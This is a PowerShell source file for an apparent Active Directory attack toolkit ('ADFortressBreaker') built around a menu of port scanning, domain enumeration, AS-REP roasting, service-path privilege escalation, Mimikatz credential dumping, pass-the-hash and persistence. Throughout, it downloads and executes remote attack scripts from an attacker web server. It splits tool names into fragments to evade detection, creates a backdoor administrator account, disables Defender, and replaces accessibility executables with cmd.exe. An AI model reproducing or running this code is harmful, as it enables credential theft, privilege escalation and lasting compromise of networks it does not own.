#SCANNER FUNCTION
function netscan {
	Clear-Host
	Write-Host -Foregroundcolor yellow $banner
	Write-Host " "
	Write-Host -Foregroundcolor yellow "Network Scanner"
	Write-Host " "
	Write-Host -Foregroundcolor yellow "For port range use - For port list use , Example: 1-1024 or 22,53,80"
	Write-Host " "
	Write-Host -Foregroundcolor yellow "Write Back to main menu or Exit to quit"
	Write-Host " "
	$ip_to_scan = Read-Host "[*] Insert the ip address to scan "
	$ip_to_scan = $ip_to_scan.ToLower()
	Write-Host " "
	if (-not($ip_to_scan.contains("exit")) -and -not($ip_to_scan.contains("back"))){
		$port = Read-Host "[*] Which port do you want to scan "
		Write-Host " "
		#RANGE SCAN
		if ($port.contains("-")) {
			$start_range, $final_range = $port -split '-'
			$start_range = [int]$start_range
			$final_range = [int]$final_range
			for ($i= $start_range; $i -le $final_range; $i++){
				try{
					$connection = new-object Net.Sockets.TcpClient
					$connection.Connect($ip_to_scan,$i)
					if ($connection.Connected){
						Write-Host "[+] Port $i is open!"
						$connection.close()
					}
				}
				catch {
					Write-Host "[-] Port $i is closed"
					continue
				}
			}
			Write-Host " "
			Read-Host "[*] Press ENTER to continue"
			netscan
		}
		#LIST SCAN
		elseif ($port.contains(",")) {
			$port = $port -split ','
			foreach ($value in $port) {
				try {
				$connection = new-object Net.Sockets.TcpClient
				$connection.Connect($ip_to_scan,$value)
				Write-Host "[+] Port $value is open!"
				$connection.close()
				}
				catch {
					Write-Host "[-] Port $value is closed"
					continue
				}
			}
			Write-Host " "
			Read-Host "[*] Press ENTER to continue"
			netscan
		}
		#SINGLE PORT SCAN
		elseif (-not($port.contains(",")) -and -not($port.contains(","))) {
			try {
				#HANDLING EXIT FOR PORT
				if ($port.contains("exit")){
					Write-Host " "
					Write-Host "[*] Bye"
					Write-Host " "
					exit
				}
				#HANDLING BACK FOR PORT
				elseif ($port.contains("back")){
					netscan
				}
				else{
					$connection = new-object Net.Sockets.TcpClient
					$connection.Connect($ip_to_scan,$port)
					Write-Host "[+] Port $port is open!"
					$connection.close()
					Write-Host " "
					Read-Host "[*] Press ENTER to continue"
					netscan
				}
			}
			catch {
					Write-Host "[-] Port $port is closed"
					Write-Host " "
					Read-Host "[*] Press ENTER to continue"
					netscan
				}
		} 
	}
	#HANDLING EXIT IP
	elseif ($ip_to_scan.contains("back")){
		intro2
	}
	#HANDLING EXIT IP
	elseif ($ip_to_scan.contains("exit")){
		Write-Host " "
		Write-Host "[*] Bye"
		Write-Host " "
		exit
	}
}
#SAVE THE HASH TO A FILE
function hash_to_file {
	if ($saveTofile -eq "Y"){
		Write-Host " "
		Write-Host "[*] Saving to file"
		
		Add-Content -Path  ((Get-Variable -ValueOnly ("user_"+$usernumber))+"_hash.txt") -Value $userHash
	}
	elseif ($saveTofile -eq "N"){
		enumeration
	}
	else{
		Write-Host " "
		Write-Host "[*] Please only Y or N"
		hash_to_file
	}
	
}
#CHOOSING FOR ASREP
function asrep_func{
	$asrep_choice = Read-Host "[*] There is some AS-REPRoastable user,do you want to get the hash of the vuln user? [ Y | N ]"
	$asrep_choice = $asrep_choice.ToUpper()
	Write-Host " "
	Write-Host "[*] Which user do you want to roast?"
	Write-Host " "
	if ($asrep_choice -eq "Y"){
		for (($s=0), ($k=1), ($h=1); $s -lt $asrepuser.length; ($s++), ($k++), ($h++)){
			Write-Host $k")" $asrepuser[$s]
			New-Variable -Name "user_$h" -Value $asrepuser[$s]
		}
		Write-Host " "
		$usernumber = Read-Host "[*] Enter the number of the user"
		Write-Host " "
		if (Get-Variable -ValueOnly ("user_"+$usernumber) -ErrorAction SilentlyContinue) {
			$download_address = "http://" + $ip_server + ":8000/Modules/ASREPRoast.ps1"
			iex ((New-Object Net.WebClient).DownloadString($download_address))
			$userHash = Get-ASREPHash -username (Get-Variable -ValueOnly ("user_"+$usernumber) -ErrorAction SilentlyContinue)
			$userHash
			Write-Host " "
			$saveTofile = Read-Host "[*] Do you want to save the hash in a file? [ Y | N ]"
			$saveTofile = $saveTofile.ToUpper()
			hash_to_file
			
		}
		else{
			Write-Host "[*] Wrong Number"
			asrep_func
		}
	}
	elseif ($asrep_choice -eq "N"){
		enumeration
	}
	else {
		Write-Host "[*] Please only Y or N"
		asrep_func
	}
}
#ENUMERATION FUNCTION THAT RETURN DOMAIN INFORMATION
function domaininfo {
	Clear-Host
	Write-Host -Foregroundcolor yellow $banner
	Write-Host " "
	Write-Host -Foregroundcolor yellow "Importing some magic in here"
	Write-Host " "
	#IMPORTING PS1 SCRIPT
	try {
		$download_address = "http://" + $ip_server + ":8000/Modules/PoWerVieW.ps1"
		iex ((New-Object Net.WebClient).DownloadString($download_address))
		#Executing EnumPhase
		Write-Host " "
		Write-Host "[*] Domain Name"
		Get-Domain | select name -ExpandProperty name
		Start-Sleep -Seconds 2
		Write-Host " "
		Write-Host "[*] Domain SID"
		Get-DomainSID
		Start-Sleep -Seconds 2
		Write-Host " "
		Write-Host "[*] Domain Controller"
		Get-DomainController | select name -ExpandProperty name
		Start-Sleep -Seconds 2
		Write-Host " "
		Write-Host "[*] Domain Computers"
		Get-DomainComputer | select name -ExpandProperty name
		Start-Sleep -Seconds 2
		Write-Host " "
		Write-Host "[*] Domain Users" 
		Get-DomainUser | select samaccountname -ExpandProperty samaccountname
		Write-Host " "
		Write-Host "[*] AS-REPRoast Users" 
		$asrepuser = (Get-DomainUser -PreauthNotRequired | select samaccountname -ExpandProperty samaccountname)
		$asrepuser
		Write-Host " "
		Write-Host "[*] Constrained Delegation" 
		Get-DomainComputer -TrustedToAuth | select msds-allowedtodelegateto -ExpandProperty msds-allowedtodelegateto -ErrorAction SilentlyContinue
		Write-Host " "
		if ($asrepuser -ne $null){
			asrep_func
		}
		Write-Host " "
		Read-Host "[*] Press ENTER to continue"
		enumeration
	}
	catch {
		Write-Host " "
		Write-Host "[*] Some error occurred, run this function with a domain user"
		Write-Host " "
		Read-Host "[*] Press ENTER to go back"
		Intro2
	}	
}
#CHECK ON ABUSING FUNCTION
function sure_abuse {
	Write-Host " "
	$wantAbuse = Read-Host "[*] Do you want to abuse one of this function? [ Y | N ]"
	$wantAbuse = $wantAbuse.ToUpper()
	if ($wantAbuse -eq "Y"){
		abusing
	}
	elseif ($wantAbuse -eq "N") {
		enumeration
	}
	elseif (($wantAbuse -ne "Y") -or ($wantAbuse -ne "N")) {
		Write-Host "[*] Please only Y or N"
		sure_abuse
	}
}
#REBOOT FUNCTION
function reboot_now {
	$reboot = Read-Host "[*] Do you want to reboot now? [ Y | N ]"
	$reboot = $reboot.ToUpper()
	if ($reboot -eq "Y"){
		shutdown /r /t 0
	}
	elseif ($reboot -eq "N"){
		intro2
	}
	else{
		Write-Host "[*] Wrong option, only Y or N."
		reboot_now
	}	
}
#RESTART SERVICE FUNCTION
function service_restart{
	$restartNow = Read-Host "[*] Do you want to try to restart the service? [ Y | N ]"
	$restartNow = $restartNow.ToUpper()
	if ($restartNow -eq "Y"){
		Invoke-Expression "sc stop $global:serviceName"
		Invoke-Expression "sc start $global:serviceName"
		Write-Host " "
		Write-Host "[*] I'am checking if the user has been created"
		Write-Host " "
		$checkUser = net user
		$checkUser = $checkUser -split " "
		for ($c = 0; $c -lt $checkUser.length; $c++){
			if ($checkUser[$c] -match '\bjohn\b') { 
				$correct_check = $checkUser[$c]
			}
		}
		if ($correct_check){
			Read-Host "[*] The user has been created correctly! Press ENTER to continue"
			intro2
		}
		else {
			Write-Host "[*] Something is wrong, reboot the machine to get the new user."
			Write-Host " "
			reboot_now
			
		}
	}
	elseif ($restartNow -eq "N") {
		intro2
	}
	elseif (($restartNow -ne "Y") -or ($restartNow -ne "N")) {
		Write-Host "[*] Please only Y or N"
		service_restart
	}
}
#BLOOD COLLECTOR FUNCTION
function blood_collector {
	Clear-Host
	Write-Host -Foregroundcolor yellow $banner
	Write-Host " "
	Write-Host -Foregroundcolor yellow "Collecting info for bloodhound"
	Write-Host " "
	#BYPASSING DOTNET
	iex (iwr -UseBasicParsing http://"$ip_server":8000/Modules/dot_bypass.txt)
	$sharp = ("SharP")
	$hound = ("HoUnD")
	$psscript = (".ps1")
	$to_pass = $sharp+$hound+$psscript
	$download_address = "http://" + "$ip_server" + ":8000/Modules/$to_pass"
	iex ((New-Object Net.WebClient).DownloadString($download_address))
	Invoke-BloodHound -c all
	Read-Host "[*] Press ENTER to continue"
	enumeration
}
#CHOOSE THE SERVICE TO ABUSE
function abusing {
	Write-Host " "
	$serviceNumber = Read-Host "[*] Enter the number of the service do you want to abuse"
	Write-Host " "
	if (Get-Variable -ValueOnly ("path_"+$serviceNumber) -ErrorAction SilentlyContinue) {
		$service_to_abuse = Get-Variable -ValueOnly ("path_"+$serviceNumber) -ErrorAction SilentlyContinue
		$manipulation = $service_to_abuse -split ";"
		for ($a = 0; $a -lt $manipulation.length; $a++){
			if ($manipulation[$a] -match '\bPath=\b') {
				$path_to_abuse = $manipulation[$a].substring(8)
			}
		}
		for ($z=0; $z -lt $manipulation.length; $z++) {
			if ($manipulation[$z] -match '\bAbuseFunction=\b') {
				$command_to_abuse = $manipulation[$z].substring(17)
			}
		}
		for ($b = 0; $b -lt $manipulation.length; $b++){
			if ($manipulation[$b] -match '\bServiceName=\b') {
				$serviceName = $manipulation[$b].substring(0,$manipulation[$b].length-1)
				$serviceName = $manipulation[$b].substring(12)
				$global:serviceName = ("`"" + $serviceName + "`"")
			}
		}
	$command_to_abuse = $command_to_abuse.replace("<HijackPath>", ("`"" + $path_to_abuse + "`""))
	Write-Host "[*] Trying to create User: john with password: Password123! and adding it to Local Administrators Group"
	Write-Host " "
	Invoke-Expression $command_to_abuse | Out-Null
	Write-Host "[*] To use this user you have to restart the vulnerable service or reboot the computer"
	Write-Host " "
	service_restart
	}
	else {
		Write-Host "[*] Wrong Number"
		abusing
	}
}
#PRIVESC FUNCTION
function privesc {
	Clear-Host
	Write-Host -Foregroundcolor yellow $banner
	Write-Host " "
	Write-Host -Foregroundcolor yellow "Checking for unquoted path"
	Write-Host " "
	#IMPORTING PS1 SCRIPT
	$download_address = "http://" + $ip_server + ":8000/Modules/powerup.ps1"
	iex ((New-Object Net.WebClient).DownloadString($download_address))
	#CHECK FOR POSSIBLE PRIVESC
	$AllChecks = Invoke-AllChecks			
	for (($i = 0), ($j = 1), ($k = 1); $i -lt $AllChecks.Length; ($i++), ($j++), ($k++)) {
		$AllChecks[$i] = [string]$AllChecks[$i]
		if ($AllChecks[$i].contains("Unquoted Service Paths")) {
			$AllChecks[$i] = $AllChecks[$i] -join " "
			$AllChecks[$i] = $AllChecks[$i].substring(0,$AllChecks[$i].length-1)
			$AllChecks[$i] = $AllChecks[$i].substring(2)
			$AllChecks[$i] = $AllChecks[$i].replace("; ",";`n`t ")
			Write-Host "$k`t"$AllChecks[$i]
			New-Variable -Name "path_$j" -Value $AllChecks[$i]
		}
	}
	if (("$"+"path_$j") -eq $null){
		Write-Host " "
		Read-Host "[*] No Unquoted Path available, press ENTER to continue"
		Write-Host " "
		enumeration
	}
	$wantAbuse = Read-Host "[*] Do you want to abuse one of this function? [ Y | N ]"
	$wantAbuse = $wantAbuse.ToUpper()
	if ($wantAbuse -eq "Y"){
		abusing
	}
	elseif ($wantAbuse -eq "N") {
		enumeration
	}
	elseif (($wantAbuse -ne "Y") -or ($wantAbuse -ne "N")) {
		Write-Host "[*] Please only Y or N"
		sure_abuse
	}
}
#ENUMERATION FUNCTION
function enumeration {
	Clear-Host
	Write-Host -Foregroundcolor yellow $banner
	Write-Host " "
	Write-Host -Foregroundcolor yellow "1) Get domain info"
	Write-Host -Foregroundcolor yellow "2) Get privesc path"
	Write-Host -Foregroundcolor yellow "3) Get info with BloodHound collector"
	Write-Host -Foregroundcolor yellow "4) Back"
	Write-Host -Foregroundcolor yellow "5) Exit"
	Write-Host " "
	$choice = Read-Host "[*] What's your choice?"
	Write-Host " "
	Switch($choice) {
		1 {
			domaininfo
		}
		2 {
			privesc
		}
		3 {
			blood_collector
		}
		4 {
			Intro2
		}
		5 {
			Write-Host "[*] Bye"
			Write-Host " "
			exit
		}
		default {
		Write-Host "[*] Wrong Option"
		Start-Sleep -Seconds 2
		Clear-Host
		enumeration
		}
	}
}
#PASS THE HASH 
function pass_the_hash_admin {
	Write-Host "[*] Getting the needed info for passing the hash"
	Write-Host " "
	$command_invoke = ("INv" + "oKe-"+"Mi"+"miK"+"atZ") + " " + "-command"
	$mimi_command = "`'" + "`"sekurlsa::logonpasswords`"" + " " + "`"quit`"" + "`'"
	$command_invoke = $command_invoke + " " + $mimi_command
	$logon_results = Invoke-Expression $command_invoke
	$logon_results = $logon_results -split "Authentication Id : "
	for ($d = 0; $d -lt $logon_results.length ; $d++){
		if ($logon_results[$d].contains("Administrator")){
			$admin_info = $logon_results[$d]
			$admin_info = $admin_info -split "msv :"
			$admin_info = $admin_info[1]
			$admin_info = $admin_info -split "tspkg :"
			$admin_info = $admin_info[0]
			$admin_info = $admin_info -split "`n"
			}
		}
	if ($admin_info -eq $null){
		Write-Host "[*] No Administrator account founded"
		Write-Host " "
		Read-Host "[*] Press ENTER to continue"
		hash_psw
	}
	else {
	for ($g = 0; $g -lt $admin_info.length; $g++){
				if ($admin_info[$g].contains("Username")){
					$username = $admin_info[$g]
					$username = $username -split " "
					$username = $username[4]
				}
			}
	for ($e = 0; $e -lt $admin_info.length; $e++){
		if ($admin_info[$e].contains("Domain")){
			$domain = $admin_info[$e]
			$domain = $domain -split " "
			$domain = $domain[6]
			}
	}
	for ($f = 0; $f -lt $admin_info.length; $f++){
		if ($admin_info[$f].contains("NTLM")){
			$ntlm_hash = $admin_info[$f]
			$ntlm_hash = $ntlm_hash -split " "
			$ntlm_hash = $ntlm_hash[8]
		}
	}
	Write-Host "[*] Trying to spawn a shell with Pass The Hash"
	Write-Host " "
	$command_invoke = ("INv" + "oKe-"+"Mi"+"miK"+"atZ") + " " + "-command"
	$mimi_command = "`'" + "`"sekurlsa::pth /user:$username /domain:$domain /ntlm:$ntlm_hash /run:powershell.exe`"" + "`'"
	$command_invoke = $command_invoke + " " + $mimi_command
	Invoke-Expression $command_invoke | Out-Null
	Read-Host "[*] The shell has been spawned successfully, press ENTER to go back"
	hash_psw
	}
}
#FUNCTION TO TELL USER TO USE THE ADMINISTRATIVE SESSION
function golden {
	$download_address = "http://" + $ip_server + ":8000/Modules/PoWerVieW.ps1"
	iex ((New-Object Net.WebClient).DownloadString($download_address))
	#Executing EnumPhase
	$domain = Get-Domain | select name -ExpandProperty name
	$domain = $domain -split "\."
	$domain = $domain[0]
	if ($domain -ne $null){
		Write-Host "[*] I have saved some info for the new session. Now from the terminal with a domain admin session execute ADGolden.ps1"
		Add-Content -Path "C:\Windows\Temp\ip_server.tmp" -Value $global:ip_server
		Add-Content -Path "C:\Windows\Temp\domain.tmp" -Value $domain
		Write-Host " "
		Read-Host "[*] Press ENTER to continue"
		persistence
	}
	else{
		Read-Host "[*] Error, domain variable is empty, press ENTER to continue"
		persistence
	}
}
#PASS THE HASH USERS
function pass_the_hash {
	Write-Host "[*] Getting the needed info for passing the hash"
	Write-Host " "
	$command_invoke = ("INv" + "oKe-"+"Mi"+"miK"+"atZ") + " " + "-command"
	$mimi_command = "`'" + "`"sekurlsa::logonpasswords`"" + "`'"
	$command_invoke = $command_invoke + " " + $mimi_command
	$logon_results = Invoke-Expression $command_invoke
	$logon_results = [string]$logon_results -split "Authentication id :"
	for (($aa = 0), ($ab = 0); $aa -lt $logon_results.length; ($aa++),($ab++)) {
		$log_splitted = $logon_results[$aa]
		$log_splitted = [string]$log_splitted
		$log_splitted = $log_splitted -split "\*"
		$log_splitted = [string]$log_splitted
		$log_splitted = $log_splitted -split "msv"
		$log_splitted = [string]$log_splitted
		if ($log_splitted.contains("Primary")){
			$log_splitted = $log_splitted -split "tspkg"
			$log_splitted = $log_splitted[0]
			$log_splitted = [String]$log_splitted
			$log_splitted = $log_splitted -split "Primary"
			$log_splitted = $log_splitted[1]
			if ($log_splitted.contains("Username")){
				$log_splitted = $log_splitted -split ":"
				$log_splitted = [string]$log_splitted
				$log_splitted = $log_splitted -split "`n"
				$log_username = $log_splitted[1]
				$log_username = [string]$log_username 
				$log_username = $log_username -split "`t"
				$log_username = $log_username[1]
				$log_username = [string]$log_username
				$log_username = $log_username -split "Username"
				$log_username = $log_username[1]
				$log_username = [string]$log_username.trim()
				New-Variable -Name "logged_username_$ab" -Value $log_username -scope global -ErrorAction SilentlyContinue
			}
		}
	}
	for (($aa = 0), ($ab = 0); $aa -lt $logon_results.length; ($aa++),($ab++)) {
		$log_splitted = $logon_results[$aa]
		$log_splitted = [string]$log_splitted
		$log_splitted = $log_splitted -split "\*"
		$log_splitted = [string]$log_splitted
		$log_splitted = $log_splitted -split "msv"
		$log_splitted = [string]$log_splitted
		if ($log_splitted.contains("Primary")){
			$log_splitted = $log_splitted -split "tspkg"
			$log_splitted = $log_splitted[0]
			$log_splitted = [String]$log_splitted
			$log_splitted = $log_splitted -split "Primary"
			$log_ntlm = $log_splitted[1]
			$log_ntlm = [string]$log_ntlm 
			$log_ntlm = $log_ntlm -split "`t"
			$log_ntlm = $log_ntlm[3]
			$log_ntlm = [string]$log_ntlm
			$log_ntlm = $log_ntlm -split "NTLM"
			$log_ntlm = $log_ntlm[1]
			$log_ntlm = [string]$log_ntlm
			$log_ntlm = $log_ntlm -split ":"
			$log_ntlm = $log_ntlm[1]
			$log_ntlm = $log_ntlm.trim()
			New-Variable -Name "logged_ntlm_$ab" -Value $log_ntlm -scope global -ErrorAction SilentlyContinue
		}
	}
	for (($aa = 0), ($ab = 0); $aa -lt $logon_results.length; ($aa++),($ab++)) {
		$log_splitted = $logon_results[$aa]
		$log_splitted = [string]$log_splitted
		$log_splitted = $log_splitted -split "\*"
		$log_splitted = [string]$log_splitted
		$log_splitted = $log_splitted -split "msv"
		$log_splitted = [string]$log_splitted
		if ($log_splitted.contains("Primary")){
			$log_splitted = $log_splitted -split "tspkg"
			$log_splitted = $log_splitted[0]
			$log_splitted = [String]$log_splitted
			$log_splitted = $log_splitted -split "Primary"
			$log_splitted = $log_splitted[1]
			if ($log_splitted.contains("Domain")){
				$log_splitted = $log_splitted -split ":"
				$log_splitted = [string]$log_splitted
				$log_splitted = $log_splitted -split "`n"
				$log_domain = $log_splitted[2]
				$log_domain = [string]$log_domain 
				$log_domain = $log_domain -split "`t"
				$log_domain = $log_domain[1]
				$log_domain = [string]$log_domain
				$log_domain = $log_domain -split "Domain"
				$log_domain = $log_domain[1]
				$log_domain = [string]$log_domain
				$log_domain = $log_domain.trim()
				New-Variable -Name "logged_domain_$ab" -Value $log_domain -scope global -ErrorAction SilentlyContinue
			}
		}
	}
	for (($ac = 1); $ac -lt $ab; ($ac++)){
		$current_user = (Get-Variable -ValueOnly ("logged_username_$ac") -ErrorAction SilentlyContinue)
		Write-Host "$ac)" $current_user
	}
	Write-Host " "
	$urChoice = Read-Host "[*] Enter the number of the user to try to open a session with PassTheHash"
	Write-Host " "
	if (Get-Variable -ValueOnly ("logged_username_$urChoice") -ErrorAction SilentlyContinue) {
		$usertoPTH = (Get-Variable -ValueOnly ("logged_username_$urChoice") -ErrorAction SilentlyContinue)
		Write-Host "[*] Username: "$usertoPTH
		$ntlmtoPTH = (Get-Variable -ValueOnly ("logged_ntlm_$urChoice") -ErrorAction SilentlyContinue)
		$ntlmtoPTH = $ntlmtoPTH.trim()
		Write-Host "[*] Hash: "$ntlmtoPTH
		$domaintoPTH = (Get-Variable -ValueOnly ("logged_domain_$urChoice") -ErrorAction SilentlyContinue)
		Write-Host "[*] Domain: "$domaintoPTH
		Write-Host " "
		if (($usertoPTH -ne $null) -and ($ntlmtoPTH -ne $null) -and ($domaintoPTH -ne $null)){
			$command_invoke = ("INv" + "oKe-"+"Mi"+"miK"+"atZ") + " " + "-command"
			Write-Host "[*] Trying to spawn a shell with Pass The Hash" 
			Write-Host " "
			$mimi_command = "`'" + "`"sekurlsa::pth /user:$usertoPTH /domain:$domaintoPTH /ntlm:$ntlmtoPTH /run:powershell.exe`"" + "`'"
			$command_invoke = $command_invoke + " " + $mimi_command
			Invoke-Expression $command_invoke | Out-Null
			Read-Host "[*] The shell has been spawned successfully, press ENTER to go back"
			hash_psw
		}
		else {
			Write-Host "[*] Some error occured, please retry"
			hash_psw
		}
	}
}
#CHOOSE THE PTT OR GOLDEN
function execution {
	Write-Host " "
	#IMPORTING PS1 SCRIPT
	$download_address = "http://" + "$ip_server" + ":8000/Modules/Invoke-Mimikatz.ps1"
	iex ((New-Object Net.WebClient).DownloadString($download_address))
	$mimichoice = Read-Host "[*] What's your choice?"
	Write-Host " "
	Switch($mimichoice) {
		1 {
			pass_the_hash
		}
		2 {
			pass_the_hash_admin
		}
		3 {
			Intro2
		}
		4 {
			Write-Host "[*] Bye"
			Write-Host " "
			exit
		}
		default {
			Write-Host "[*] Wrong Option"
			Start-Sleep -Seconds 2
			Clear-Host
			hash_psw
		}
	}
}
#MIMI TIME
function hash_psw {
	Clear-Host
	Write-Host -Foregroundcolor yellow $banner
	Write-Host " "
	Write-Host -Foregroundcolor yellow "You need an account with admin privs"
	Write-Host " "
	Write-Host -Foregroundcolor yellow "1) Check for possible pth session"
	Write-Host -Foregroundcolor yellow "2) Check for admin pth session"
	Write-Host -Foregroundcolor yellow "3) Back"
	Write-Host -Foregroundcolor yellow "4) Exit"
	execution
}
#CHECK ON IP SET
function checkWebserver {
	if ($global:ip_server -eq $null){
		$global:ip_server = Read-Host "[*] Set the web server ip address "
		Write-Host " "
		try {
			$tcp_connection = new-object System.Net.Sockets.TcpClient($global:ip_server, 8000) 
			if ($tcp_connection.Connected){
				Write-Host "[*] Everything is ready to break the fortress"
				Write-Host " "
				$tcp_connection.close()
			}
		}
		catch {
			Write-Host "[*] The ip submitted is wrong or unreachable"
			$global:ip_server = $null
			Write-Host " "
			Read-Host "[*] Press ENTER to continue" 
			checkWebserver
		}
	}	
}
#SETTING WEB SERVER IP
function setWebserver {
	if ($global:ip_server -eq $null){
		Write-Host "[*] Start a web server on your machine (exposed on port 8000) to download the .ps1 file"
		Write-Host " "
		Write-Host "[*} Example: python3 -m http.server"
		Write-Host " "
		$global:ip_server = Read-Host "[*] Set the web server ip address "
		Write-Host " "
		try{ 
			$tcp_connection = new-object System.Net.Sockets.TcpClient($global:ip_server, 8000)
			if ($tcp_connection.Connected){
				Write-Host "[*] Everything is ready to break the fortress"
				Write-Host " "
				$tcp_connection.close()
			}
		}
		catch {
			Write-Host "[*] The ip submitted is wrong or unreachable"
			$global:ip_server = $null
			Write-Host " "
			Read-Host "[*] Press ENTER to continue" 
			checkWebserver
		}
	}
}
#EXE PERSISTENCE
function exe_persistence{
	Write-Host "[*] Replacement of exe files"
	Write-Host " "
	Write-Host "[*] Disabling Defender Real Time Monitoring"
	Set-MpPreference -DisableRealTimeMonitoring $True
	Write-Host " "
	Write-Host "[*] Replacing Utilman.exe - Windows Key+U to Abuse"
	REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f | Out-Null
	Write-Host " "
	Write-Host "[*] Replacing sethc.exe - Press F5 few times to Abuse"
	REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f | Out-Null
	Write-Host " "
	Write-Host "[*] Replacing Magnify.exe - From login interface, click on magnify tool"
	takeown /f "C:\Windows\System32\Magnify.exe" | Out-Null
	icacls "C:\Windows\System32\Magnify.exe" /grant administrators:F | Out-Null
	ren "C:\Windows\System32\Magnify.exe" "Magnify_back.exe" | Out-Null
	copy "C:\Windows\System32\cmd.exe" "C:\Windows\System32\Magnify.exe" | Out-Null
	Write-Host " "
	Write-Host "[*] Replacing narrator.exe - From login interface, click on narrator tool"
	takeown /f "C:\Windows\System32\Narrator.exe" | Out-Null
	icacls "C:\Windows\System32\Narrator.exe" /grant administrators:F | Out-Null
	ren "C:\Windows\System32\Narrator.exe" "Narrator_back.exe" | Out-Null
	copy "C:\Windows\System32\cmd.exe" "C:\Windows\System32\Narrator.exe" | Out-Null
	Write-Host " "
	Read-Host "[*] Replacement completed, press ENTER to continue"
	persistence
}
#PERSISTENCE FUNCTION
function persistence{
	Clear-Host
	Write-Host -Foregroundcolor yellow $banner
	Write-Host " "
	Write-Host -Foregroundcolor yellow "Remember, to use this section you need an account with administrative privileges."
	Write-Host " "
	Write-Host -Foregroundcolor yellow "1) GoldenTicket"
	Write-Host -Foregroundcolor yellow "2) EXE Replacement"
	Write-Host -Foregroundcolor yellow "3) Back"
	Write-Host -Foregroundcolor yellow "4) Exit"
	Write-Host " "
	$MENU = Read-Host "[*] What's your choice?"
	Write-Host " "
	Switch ($MENU){
		1 {
			golden
		}
		2 {	
			exe_persistence
		}
		3 {
			intro2
		}
		4 {
			Write-Host "[*] Bye"
			Write-Host " "
			exit
		}
		default {
			Write-Host "Wrong Option"
			Start-Sleep -Seconds 2
			Clear-Host
			intro2
		}
	}
}
#MAIN MENU
function Intro1 {
	Clear-Host
	Write-Host -Foregroundcolor yellow $banner
	Write-Host " "
	Write-Host -Foregroundcolor yellow "1) Reconnaissance"
	Write-Host -Foregroundcolor yellow "2) Enumeration"
	Write-Host -Foregroundcolor yellow "3) PassTheHash"
	Write-Host -Foregroundcolor yellow "4) Persistence"
	Write-Host -Foregroundcolor yellow "5) Exit"
	Write-Host " "
	if ($ip_server -ne $null){
		$global:ip_server = $null
		$global:domain = $null
		Write-Host " "
		setWebserver
		$MENU = Read-Host "[*] What's your choice?"
		Write-Host " "
		Switch ($MENU)
		{
			1 {
				netscan
			}
			2 {	
				enumeration
			}
			3 {
				hash_psw
			}
			4 {
				persistence
			}
			5 {
				Write-Host " "
				Write-Host "[*] Bye"
				Write-Host " "
				exit
			}
			default {
				Write-Host "Wrong Option"
				Start-Sleep -Seconds 2
				Clear-Host
				Intro2
			}
		}
	}
	else {
		Write-Host " "
		$global:domain = $null
		setWebserver
		$MENU = Read-Host "[*] What's your choice?"
		Write-Host " "
		Switch ($MENU)
		{
			1 {
				netscan
			}
			2 {	
				enumeration

			}
			3 {
				hash_psw
			}
			4 {
				persistence
			}
			5 {
				Write-Host " "
				Write-Host "[*] Bye"
				Write-Host " "
				exit
			}
			default {
				Write-Host "Wrong Option"
				Start-Sleep -Seconds 2
				Clear-Host
				Intro2
			}
		}
	}
}
#MAIN MENU WITHOUT GLOBAL VARIABLE CHECKS
function Intro2 {
	Clear-Host
	Write-Host -Foregroundcolor yellow $banner
	Write-Host " "
	Write-Host -Foregroundcolor yellow "1) Reconnaissance"
	Write-Host -Foregroundcolor yellow "2) Enumeration"
	Write-Host -Foregroundcolor yellow "3) PassTheHash"
	Write-Host -Foregroundcolor yellow "4) Persistence"
	Write-Host -Foregroundcolor yellow "5) Exit"
	Write-Host " "
	$MENU = Read-Host "[*] What's your choice?"
	Write-Host " "
	Switch ($MENU){
		1 {
			netscan
		}
		2 {	
			enumeration

		}
		3 {
			hash_psw
		}
		4 {
			persistence
		}
		5 {
			Write-Host "[*] Bye"
			Write-Host " "
			exit
		}
		default {
			Write-Host "Wrong Option"
			Start-Sleep -Seconds 2
			Clear-Host
			Intro2
		}
	}
}
$banner = "           _____  ______         _                     ____                 _             
     /\   |  __ \|  ____|       | |                   |  _ \               | |            
    /  \  | |  | | |__ ___  _ __| |_ _ __ ___  ___ ___| |_) |_ __ ___  __ _| | _____ _ __ 
   / /\ \ | |  | |  __/ _ \| '__| __| '__/ _ \/ __/ __|  _ <| '__/ _ \/ _` | |/ / _ \ '__|
  / ____ \| |__| | | | (_) | |  | |_| | |  __/\__ \__ \ |_) | | |  __/ (_| |   <  __/ |   
 /_/    \_\_____/|_|  \___/|_|   \__|_|  \___||___/___/____/|_|  \___|\__,_|_|\_\___|_|   
"


Set-Alias Invoke-ADFortressBreaker Intro1